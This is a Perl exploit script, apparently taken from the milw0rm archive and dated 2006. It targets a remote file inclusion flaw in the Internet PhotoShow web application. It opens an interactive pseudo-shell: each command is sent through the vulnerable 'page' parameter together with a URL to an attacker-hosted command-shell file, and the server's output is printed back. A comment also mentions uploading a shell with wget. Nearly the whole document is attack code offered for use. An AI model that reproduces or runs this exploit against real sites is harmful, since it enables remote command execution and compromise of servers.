#!/usr/bin/perl
#
# Exploit by Hessam-x (www.hessamx.net)
# sub usage()
# {
 #print " Usage: perl hx.pl [host] [cmd shell] [cmd shell variable]\r\n\n";
 #print " example : perl hx.pl www.milw0rm.com milw0rm.com/hx.txt cmd";
 #exit();
 #}
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  )\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                 DeltaHAcking Team                  #
#           website: www.deltahacking.com            #
######################################################
#  Internet PhotoShow Remote File Inclusion Exploit  #
######################################################
# upload a shell with this xpl:
# wget http://shell location/
use LWP::UserAgent;
print "-------------------------------------------\n";
print "=             Internet PhotoShow          =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "-------------------------------------------\n\n";


$bPath = $ARGV[0];
$cmdo = $ARGV[1];
$bcmd = $ARGV[2];

if($bPath!~/http:\/\// || $cmdo!~/http:\/\// || !$bcmd){usage()}



while()
{
       print "Hessam-x@PhotoShow \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$bpath.'index.php?page='.$cmdo.'?&'.$bcmd.'='.$cmd)or die "\n[-] Could not connect !\n";

$res = $xpl->request($req);

$return = $res->content;
$return =~ tr/[\n]/[ê]/;

if (!$cmd) {print "\n[!] Please type a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/)
       {print "\n[-] Could Not Connect to cmd Host\n";exit}
elsif ($return =~/^<b>Fatal.error/) {print "\n[-] Invalid Command\n"}

if($return =~ /(.*)/)


{
       $freturn = $1;
       $freturn=~ tr/[ê]/[\n]/;
       print "\r\n$freturn\n\r";
       last;
}

else {print "Hessam-x@PhotoShow \$";}}}last;


sub usage()
 {
print "[!] Usage : hx.pl [host] [cmd shell location] [cmd shell variable]\n";
print " - E.g : hx.pl http://www.milw0rm.com http://www.milw0rm.com/shell.txt cmd\n";
 exit();
 }

# milw0rm.com [2006-04-18]
